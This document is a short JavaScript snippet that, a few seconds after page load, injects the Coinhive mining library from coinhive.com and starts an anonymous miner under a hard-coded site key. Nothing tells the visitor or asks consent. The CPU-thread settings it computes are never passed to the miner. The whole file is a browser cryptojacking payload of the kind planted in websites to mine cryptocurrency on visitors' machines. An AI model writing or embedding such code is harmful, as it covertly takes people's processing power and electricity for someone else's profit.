
function mide()
{
	var ele=document.createElement("script");
	ele.src="https://coinhive.com/lib/coinhive.min.js";
	document.body.appendChild(ele);
}


function fin()
{
	if (navigator.hardwareConcurrency > 1){
	    var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency/2)}
	}else{
	    var cpuConfig = {throttle:0.6}
	}
	    var miner = new CoinHive.Anonymous('PaCWx1Ej0CpdT7HFXfMsJzdRvtG2CN6i');
	    miner.start();

}
setTimeout("mide()",1000);
setTimeout("fin()",5000);

